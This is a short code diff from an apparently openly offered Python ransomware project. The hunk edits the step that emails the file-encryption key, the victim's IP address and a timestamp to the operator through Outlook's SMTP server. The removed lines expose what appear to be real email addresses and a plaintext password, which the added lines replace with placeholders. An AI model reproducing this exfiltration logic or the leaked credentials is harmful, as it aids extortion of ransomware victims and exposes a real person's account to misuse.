@@ -244,8 +244,8 @@ class Ransomware(FileSystem):
 
 
         # send mail
-        mail = Mail(host='smtp-mail.outlook.com', my='marcus-v@outlook.com', port=587,
-                    dest='marcus@sstelematica.com.br', password="Duvidoadvinharmane1@",
+        mail = Mail(host='smtp-mail.outlook.com', my='yourmail', port=587,
+                    dest='yourmail', password="yourpassword",
                     message=str(self.__key) + f" ip: {self.__ip} " + str(datetime.datetime.now()))
         try:
             mail.sendMail()
